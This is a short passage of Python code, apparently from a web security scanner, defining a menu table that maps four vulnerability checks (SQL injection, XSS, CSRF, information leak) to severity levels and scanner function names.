SCAN_TYPES = {
    "1": ("SQL Injection",       "CRITICAL", scan_sql),
    "2": ("XSS",                 "HIGH",     scan_xss),
    "3": ("CSRF",                "HIGH",     scan_csrf),
    "4": ("Information Leak",    "MEDIUM",   scan_info_leak),
